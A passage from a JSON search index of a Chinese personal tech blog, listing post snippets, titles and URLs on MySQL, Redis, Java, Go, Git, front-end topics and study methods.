即对逻辑结构等有操作的，","lvl0":"SQL语句及优化","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"cd93aea976dfc93620659aa37b84f0e8","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/6.sql%E8%AF%AD%E5%8F%A5%E5%8F%8A%E4%BC%98%E5%8C%96/"},{"content":"缓存雪崩 Redis中大批量key在同一时间同时失效导致所有请求都打到了MySQL。而MySQL扛不住导致大面积崩塌 解决方案 缓存数据的过期时间","lvl0":"常见问题","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"bea6ce0491b1a62259717ec4ee15ff9f","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/4.%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98/"},{"content":"包括 RDB 和 AOF 两种机制，下面分别进行说明 RDB RDB 持久化机制，是对 Redis 中的数据执行周期性的持久化。更适合做冷备。 优点： 压缩后的二进制文，适用于备份、全量","lvl0":"持久化","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"0db2b97f2960e902d5eace9d17aa3c45","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/2.%E6%8C%81%E4%B9%85%E5%8C%96/"},{"content":"分布式锁 在日常情况下在进程或线程中我们可以使用 synchronized 、Lock 实现并发编程，但是我， 如何在分布式集群下使用呢？可以使用 Redisson ， Zookeeper ，Redis本身 分布","lvl0":"分布式锁，过期策略，淘汰规则","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"682d5850af17008de399b270e8d6f18f","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/5.-%E5%88%86%E5%B8%83%E5%BC%8F%E9%94%81%E8%BF%87%E6%9C%9F%E7%AD%96%E7%95%A5%E6%B7%98%E6%B1%B0%E8%A7%84%E5%88%99/"},{"content":"Redis有下面四种部署方式 模式 优点 缺点 单机版 架构简单，部署方便 机器故障、容量瓶颈、QPS瓶颈 主从复制 高可靠性，读写分离 故障恢复复杂，主库的","lvl0":"集群和限流","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"be3e6bef78b83ecfdbb3a1b955a3a1cf","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/6.%E9%9B%86%E7%BE%A4%E5%92%8C%E9%99%90%E6%B5%81/"},{"content":"概念 事务是一个不可分割的数据库操作序列，也是数据库并发控制的基本单位，其执行的结果必须使数据库从一种一致性状态变到另一种一致性状态。事务是逻","lvl0":"事务和锁","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"2eeb4cc6102b41b64837977fc79a9a9b","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/4.%E4%BA%8B%E5%8A%A1%E5%92%8C%E9%94%81/"},{"content":"什么是视图 所谓视图，本质上是一种虚拟表，在物理上是不存在的，其内容与真实的表相似，包含一系列带有名称的列和行数据。但是，视图并不在数据库中以","lvl0":"视图，存储过程，函数，触发器","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"03508ca621da1e18e20463ed009b9500","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/5.%E8%A7%86%E5%9B%BE%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%87%BD%E6%95%B0%E8%A7%A6%E5%8F%91%E5%99%A8/"},{"content":"数据库三大范式 第一范式（属性不可再分） 如果数据库表中的所有字段值都是不可分解的原子值，就说明该数据库表满足了第一范式。 第二范式（每个非主属性","lvl0":"数据库基础","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"34553994eaecee40ac7e705c86fb1782","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/1.%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80/"},{"content":"本文参考：硬核Redis总结，看这篇就够了！ (qq.com) 8大基本数据类型 String 适用于简单key-value存储、setnx key value实现分布式锁、计数器","lvl0":"数据类型","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"343f0d0ed5d9ecb4acd36096e4498547","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/1.%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/"},{"content":"概念 索引是一种特殊的文件(InnoDB数据表上的索引是表空间的一个组成部分)，它们包含着对数据表里所有记录的引用指针。 索引是一种数据结构。数","lvl0":"索引","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"82d1010c7f524f667310c136c7b3bb33","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/3.%E7%B4%A2%E5%BC%95/"},{"content":"常考的主要分为InnoDB，MyISAM 主要区别 InnoDB引擎的4大特性 插入缓冲（insert buffer) 二次写(double write) 自适应哈希索引(ah","lvl0":"引擎","lvl1":["数据库","MySQL"],"lvl2":"摘要","objectID":"0ce5397bdcb08b44324ec6fec16314b2","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/01.mysql/2.%E5%BC%95%E6%93%8E/"},{"content":"为什么Redis速度那么快 基于内存实现 数据结构高效，底层多种数据结构支持不同的数据类型，比如HyperLogLog它连2个字节都不想浪费 提供","lvl0":"原理","lvl1":["数据库","NoSQL","Redis"],"lvl2":"摘要","objectID":"c7939badb3818a597eb27224f1e10d69","tags":[""],"url":"https://lyr-2000.github.io/post/02.%E6%95%B0%E6%8D%AE%E5%BA%93/02.redis/3.%E5%8E%9F%E7%90%86/"},{"content":"这里主要涉及到IO多路复用 基本概念介绍 BIO 同步并阻塞，服务器实现模式为一个连接一个线程，即客户端有连接请求时服务器端就需要启动一个线程进行处理","lvl0":"IO NIO框架","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"20b0cd1aadbf5a7c32d27fc7b0ca1051","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/5.io-nio%E6%A1%86%E6%9E%B6/"},{"content":"java语言的特性 Lambda表达式和函数式接口 最简单的lambda表达式如下 1 Arrays.asList( \u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;d\u0026#34; ).forEach( e -\u0026gt; System.out.println( e ) ); 当然，为了显式说明某个接口是函数式接口","lvl0":"java8特性","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"fec1e22ec031b91cbe9ae2742cfba30c","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/10.java8%E7%89%B9%E6%80%A7/"},{"content":"return和finally的执行顺序 finally语句在return语句执行之后return返回之前执行的，所以我们先执行return的语","lvl0":"java基础","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"128cc804c2dd57737d4d84e641121e3a","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/1.java%E5%9F%BA%E7%A1%80/"},{"content":"JVM内存模型 这里主要还是会问一些Java的内存模型，1.8之前和之后的内存模型是不一样的 简单说一下每个部分是干嘛的吧 程序计数器 用于记录程序","lvl0":"JVM模型","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"dba1a1d62b1a46b90e3e15ed027c9539","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/6.jvm%E6%A8%A1%E5%9E%8B/"},{"content":"并发框架，其实也叫 JUC 即 java.util.concurrent 包，分为（锁框架、原子类框架、同步器框架、集合框架、执行器框架） 线程创建方式 继承Thread类重写run方法 1 2 3 4","lvl0":"并发框架(JUC)","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"cab1c726434edd7e0a483706e89387f0","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/4.%E5%B9%B6%E5%8F%91%E6%A1%86%E6%9E%B6juc/"},{"content":"","lvl0":"参数调优","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"3791ff405dc05647fb1486c133352b2c","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/9.%E5%8F%82%E6%95%B0%E8%B0%83%E4%BC%98/"},{"content":"for和range for循环的三种用法 for range用于遍历切片，数组或者map 几个用法 使用 for range a {} 遍历数组和切片，不关心索引和数据的情况； 使","lvl0":"常用关键字","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"6560e1901a6a172d7e9e93204cee4376","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/4.%E5%B8%B8%E7%94%A8%E5%85%B3%E9%94%AE%E5%AD%97/"},{"content":"集合框架也可以叫容器。（集合是用于存储数据的容器） 常问的有下面几个 ArrayList LinkList HashSet TreeSet HashMap List(对付顺序的好帮手)： 存储的元素是有序的、可重复的。 Se","lvl0":"集合框架","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"1a515a2d0134df852e1c2c46e4399322","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/3.%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6/"},{"content":"判断对象是否是垃圾 引用计数算法：判断对象的引用数量 每引用一次就+1，当一个对象实例的某个引用超过了生命周期或者被设置为一个新值时，对象实例的","lvl0":"垃圾回收","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"c7f6f4d108288c9c657cd8e208b73ede","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/8.%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6/"},{"content":"类加载流程 只需要记住下面这5个阶段就行了 参考：JVM 基础 - Java 类加载机制 | Java 全栈知识体系 (pdai.tech) 下面简单介绍一下每个部分做了啥 加载 首先获取二进制流，","lvl0":"类加载机制","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"67f366c72746e5662f2c09c76ed1d3af","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/7.%E7%B1%BB%E5%8A%A0%E8%BD%BD%E6%9C%BA%E5%88%B6/"},{"content":"这个部分主要以面试题为主 京东面试题 是equals而不是equal，单词错了 类和对象 面向对象和面向过程的区别 面向过程 ：面向过程性能比面向对象高","lvl0":"面向对象","lvl1":["程序语言","JAVA"],"lvl2":"摘要","objectID":"e7a742bca126ea37dabf0d90af9a61aa","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/02.java/2.%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1/"},{"content":"数据类型 数据类型占用的字节数 整数 int 64位操作系统默认为int64,32位操作系统为int32,但是类型检查时时int int8 (byte 1字节) int16 (short 2字节)","lvl0":"数据结构","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"443a2ee585f83233f04e1b2f9b9c3e5b","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/2.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"},{"content":"函数调用 这里面涉及的东西其实挺深的，所以等我后面又时间再去研究 Go 中函数传参仅有值传递一种方式； slice、map、channel都是引用类型","lvl0":"语言基础","lvl1":["程序语言","Go"],"lvl2":"摘要","objectID":"6b5d9317927390326c5048e3e45b36de","tags":[""],"url":"https://lyr-2000.github.io/post/01.%E7%A8%8B%E5%BA%8F%E8%AF%AD%E8%A8%80/01.go/3.%E8%AF%AD%E8%A8%80%E5%9F%BA%E7%A1%80/"},{"content":"JS设计模式总结笔记 开篇：前端工程师的成长论 能够决定一个前端工程师的本质的，不是那些瞬息万变的技术点，而是那些不变的东西。 所谓“不变的东西”","lvl0":"JS设计模式总结笔记","lvl1":["前端","学习笔记"],"lvl2":"摘要","objectID":"4c83bf0a3b9e65bc201cfed5c2841e19","tags":["设计模式"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/50.js%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93%E7%AC%94%E8%AE%B0/"},{"content":"geohash算法参考 geohash算法的库 https://github.com/gansidui/geohash https://github.com/gansidui/nearest","lvl0":"geohash算法","lvl1":null,"lvl2":"摘要","objectID":"68aaf145e45be4b7c050845bbb02cf4d","tags":null,"url":"https://lyr-2000.github.io/post/14.%E6%96%B0%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%8E%9F%E7%90%86/%E6%96%B0%E6%8A%80%E6%9C%AF%E6%9D%82%E8%AE%B0/geohash%E7%AE%97%E6%B3%95/"},{"content":"","lvl0":"Git命令思维导图","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"359a8cdf72b4062f6bf0d94bf12f18bc","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.%E6%89%8B%E5%86%8C/06.git%E5%91%BD%E4%BB%A4%E6%80%9D%E7%BB%B4%E5%AF%BC%E5%9B%BE/"},{"content":"rebase分支合并 说明 以下 v2 是某个需求的开发分支， dev是总的开发分支，v2 是基于dev分支签出的。 当完成v2的开发后，需要把代码合并到d","lvl0":"Git变基合并","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"b383bb8812f621112427d33ec9f11ba2","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.%E6%89%8B%E5%86%8C/03.git%E5%8F%98%E5%9F%BA%E5%90%88%E5%B9%B6/"},{"content":"Git分支-变基 在 Git 中整合来自不同分支的修改主要有两种方法：merge 以及 rebase。 在本节中我们将学习什么是“变基”，怎样使用“变基”，","lvl0":"Git分支-变基","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"a68e1156adc8ef3e8e3fa76abfabd1a3","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/70.git%E5%88%86%E6%94%AF-%E5%8F%98%E5%9F%BA/"},{"content":"Git分支-分支原理 Git 处理分支的方式可谓是难以置信的轻量，创建新分支这一操作几乎能在瞬间完成，并且在不同分支之间的切换操作也是一样便捷。 与许","lvl0":"Git分支-分支原理","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"cb7c3da146608f94c41cf814be452367","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/20.git%E5%88%86%E6%94%AF-%E5%88%86%E6%94%AF%E5%8E%9F%E7%90%86/"},{"content":"Git分支-远程分支 远程引用是对远程仓库的引用（指针），包括分支、标签等等。 远程分支本质上也是一个指针，指向远程地址 查看远程引用列表与信息 1","lvl0":"Git分支-远程分支","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"c0a341136f813e6f2f759aabff27cb7d","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/60.git%E5%88%86%E6%94%AF-%E8%BF%9C%E7%A8%8B%E5%88%86%E6%94%AF/"},{"content":"Git分支的新建与合并-分支操作 文档：Git 分支 - 分支的新建与合并 创建分支并切换 此时有一个需求需要在新的分支iss53上工作： 1 $ git checkout -b iss53 #","lvl0":"Git分支的新建与合并-分支操作","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"965d5bf3a8ff6b56b17eab05e9b2b9c3","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/30.git%E5%88%86%E6%94%AF%E7%9A%84%E6%96%B0%E5%BB%BA%E4%B8%8E%E5%90%88%E5%B9%B6-%E5%88%86%E6%94%AF%E6%93%8D%E4%BD%9C/"},{"content":"Git分支管理-查看分支 查看分支 1 2 3 4 $ git branch iss53 * master # 带星号*表示当前所在分支 testing git branch 命令不只是可以创建与删除分支。 如果不加任何参数运行它，会","lvl0":"Git分支管理-查看分支","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"01ce0dc5746ace2725230b583d8936ae","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/40.git%E5%88%86%E6%94%AF%E7%AE%A1%E7%90%86-%E6%9F%A5%E7%9C%8B%E5%88%86%E6%94%AF/"},{"content":"Git分支开发工作流 文档：Git分支开发工作流 长期分支 因为 Git 使用简单的三方合并，所以就算在一段较长的时间内，反复把一个分支合并入另一个分支，","lvl0":"Git分支开发工作流","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"90fe8a5f5de5dc4de7f356b2c1a39830","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/50.git%E5%88%86%E6%94%AF%E5%BC%80%E5%8F%91%E5%B7%A5%E4%BD%9C%E6%B5%81/"},{"content":"Git工具-查看修订版本 Git 能够以多种方式来指定单个提交、一组提交、或者一定范围内的提交。 了解它们并不是必需的，但是了解一下总没坏处。 修订版本","lvl0":"Git工具-查看修订版本","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"832a09e27c5e212364dcdc27d8143200","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/80.git%E5%B7%A5%E5%85%B7-%E6%9F%A5%E7%9C%8B%E4%BF%AE%E8%AE%A2%E7%89%88%E6%9C%AC/"},{"content":"Git工具-交互式暂存 本节中的几个交互式 Git 命令可以帮助你将文件的特定部分组合成提交。 当你在修改了大量文件后，希望这些改动能拆分为若干提交而不","lvl0":"Git工具-交互式暂存","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"499d7d56a43e1ab814d4eda82af5a7c3","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/90.git%E5%B7%A5%E5%85%B7-%E4%BA%A4%E4%BA%92%E5%BC%8F%E6%9A%82%E5%AD%98/"},{"content":"Git 工具 - 重写历史 许多时候，在使用 Git 时，你可能想要修订提交历史。 Git 很棒的一点是它允许你在最后时刻做决定。 你可以在将暂存区内容提交前决定哪些文件","lvl0":"Git工具-重写历史","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"4b9b7e5eff4a398d43eee9e9a29b8020","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/100.git%E5%B7%A5%E5%85%B7-%E9%87%8D%E5%86%99%E5%8E%86%E5%8F%B2/"},{"content":"Git 工具 - 重置揭密 在继续了解更专业的工具前，我们先探讨一下 Git 的 reset 和 checkout 命令。 在初遇的 Git 命令中，这两个是最让人困惑的。 它们能做很多事情，所以看起来","lvl0":"Git工具-重置揭密","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"074a14f2bf13893920e10fd697478f12","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/110.git%E5%B7%A5%E5%85%B7-%E9%87%8D%E7%BD%AE%E6%8F%AD%E5%AF%86/"},{"content":"Git基础与命令 官方文档（中文）：https://git-scm.com/book/zh/v2 本文档是根据官方文档来编写的，以官方文档为准。","lvl0":"Git基础与命令","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"0529a46e3af2493c28cd32919582af70","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/20.%E6%96%87%E6%A1%A3%E7%AC%94%E8%AE%B0/10.git%E5%9F%BA%E7%A1%80%E4%B8%8E%E5%91%BD%E4%BB%A4/"},{"content":"常用Git命令清单 一般来说，日常使用只要记住下图6个命令，就可以了。但是熟练使用，恐怕要记住60～100个命令。 下面是我整理的常用 Git 命令清单","lvl0":"常用Git命令清单","lvl1":["《Git》学习笔记"],"lvl2":"摘要","objectID":"7b14aa2f042ffa5b6f3cda6e8af41753","tags":["Git"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/08.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/10.%E6%89%8B%E5%86%8C/00.%E5%B8%B8%E7%94%A8git%E5%91%BD%E4%BB%A4%E6%B8%85%E5%8D%95/"},{"content":"","lvl0":"《Git》学习笔记","lvl1":null,"lvl2":"摘要","objectID":"fa19ab0e9055ed5fbdd23fb0dabcea31","tags":null,"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/33.git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"},{"content":"每当你发现很难开始执行某项任务时，可以试试将其缩减成2分钟的版本。 看一本书 → 看一页书 写一篇文章 → 写一句话 跑10公里 → 穿上跑鞋 做100次俯卧撑","lvl0":"2分钟规则","lvl1":["更多","实用技巧"],"lvl2":"摘要","objectID":"8877b3f55b23c323eb3b8337a2755892","tags":["实用技巧","文摘"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/10.%E5%AE%9E%E7%94%A8%E6%8A%80%E5%B7%A7/01.2%E5%88%86%E9%92%9F%E8%A7%84%E5%88%99/"},{"content":"TypeScript 学习笔记 TypeScript 的类型校验是给程序员看的，在编译后不会存在TS代码。 类型注解 1 2 3 4 5 6 function fn(person: string):void{ // 参数类型是字符串，没有返回值 ///... } fn(\u0026#39;str\u0026#39;) // 如传递参数非","lvl0":"TypeScript笔记","lvl1":["前端","学习笔记"],"lvl2":"摘要","objectID":"d3d6ac025a1bf38c662598b2d3702268","tags":["TypeScript"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/35.typescript%E7%AC%94%E8%AE%B0/"},{"content":"Flex 布局教程：语法篇 http://www.ruanyifeng.com/blog/2015/07/flex-grammar.html CSS Grid 网格布局教程 http://www.ruanyifeng.com/blog/2019/03/grid-layout-tutorial.html 只要一行代码，实现五种 CSS 经典布局 http://www.ruanyifeng.com/blog/2020/08/five-css-layouts-in-one-line.html 空间居中布局 不管容器的大小，项目总是占据中心点 并列式布局 多个项目并列","lvl0":"CSS教程和技巧收藏","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"32a2c207ea50ce715afc062eb7e514d6","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/00.css%E6%95%99%E7%A8%8B%E5%92%8C%E6%8A%80%E5%B7%A7%E6%94%B6%E8%97%8F/"},{"content":"Vuex Vuex 是一个专为 Vue.js 应用程序开发的状态管理模式。 Vuex使用过程演示 以vue-cli3新创建出来的项目为例，演示Vuex的使用过程。 创建项目: 1","lvl0":"Vuex","lvl1":["《Vue》笔记","Vuex"],"lvl2":"摘要","objectID":"1eebe6d710f30849dcc9367391ef38cd","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/10.vue%E7%AC%94%E8%AE%B0/10.vuex/01.vuex/"},{"content":"反向拆解让人上瘾的套路，找回自律 当你打开手机准备学习或者查个资料的时候，很有可能不知不觉的就脱离的正规\u0026hellip; 某某app发来通知：x","lvl0":"反向拆解让人上瘾的套路，找回自律","lvl1":["更多","心情杂货"],"lvl2":"摘要","objectID":"bba6dbef77ebc5d31e70e7f5006bed60","tags":["心理","自律"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/05.%E5%BF%83%E6%83%85%E6%9D%82%E8%B4%A7/10.%E5%8F%8D%E5%90%91%E6%8B%86%E8%A7%A3%E8%AE%A9%E4%BA%BA%E4%B8%8A%E7%98%BE%E7%9A%84%E5%A5%97%E8%B7%AF%E6%89%BE%E5%9B%9E%E8%87%AA%E5%BE%8B/"},{"content":"::: center 康奈尔笔记法 思维导图法 金三角笔记法 曼陀罗九宫格笔记法 记号记录法 六色笔记法 加工笔记法 整理笔记要点1-科学标记重点 整理笔记要点2-修改不涂改","lvl0":"笔记方法","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"2a6ad31380ec5bcfedfad771b128ab15","tags":["笔记方法"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/01.%E7%AC%94%E8%AE%B0%E6%96%B9%E6%B3%95/"},{"content":"费曼学习法，我很喜欢的一个学习方法，简单来说，就是：通过向别人清楚的解说某一件事或是写一篇浅显易懂的教程文章，来确认自己是否真正弄懂了这件事","lvl0":"费曼学习法","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"5800b23cc8cbae5757fb09929c4d62b5","tags":["学习方法"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/00.%E8%B4%B9%E6%9B%BC%E5%AD%A6%E4%B9%A0%E6%B3%95/"},{"content":"《JavaScript高级程序设计》笔记 第1章 JavaScript简介 JavaScript诞生于1995年 一个完整的JavaScript由这","lvl0":"《JavaScript高级程序设计》笔记","lvl1":["笔记"],"lvl2":"摘要","objectID":"02fadc46acfe70e351dcbe23caf7dd9a","tags":["笔记","红宝书"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/01.%E5%89%8D%E7%AB%AF/02.%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/05.javascript%E9%AB%98%E7%BA%A7%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1%E7%AC%94%E8%AE%B0/"},{"content":"搜索引擎相信大家经常在使用，但是有时候想搜某个信息时却搜出来一大堆不相关的（百度：你们都在看我干什么？）。下面我们来介绍几种搜索技巧，可以提","lvl0":"搜索引擎使用技巧","lvl1":["更多","学习"],"lvl2":"摘要","objectID":"63b87e187b2e14397a38bfd482055a24","tags":["搜索技巧"],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/04.%E6%9B%B4%E5%A4%9A/01.%E5%AD%A6%E4%B9%A0/10.%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8%E6%8A%80%E5%B7%A7/"},{"content":"","lvl0":"CSS-function汇总","lvl1":["页面","CSS"],"lvl2":"摘要","objectID":"2e0f1b6e9368d88864504cc6194fd2ea","tags":[""],"url":"https://lyr-2000.github.io/post/09.%E5%89%8D%E7%AB%AF/02.%E9%A1%B5%E9%9D%A2/20.css/60.css-function%E6%B1%87%E6%80%BB/"},{"content":"个人收藏夹 大佬收藏夹 panjiachen 文档 MDN | MDN-JS标准内置对象 Web技术权威文档 现代JavaScript教程 以最新标准为基准的JS教程 ES5教程 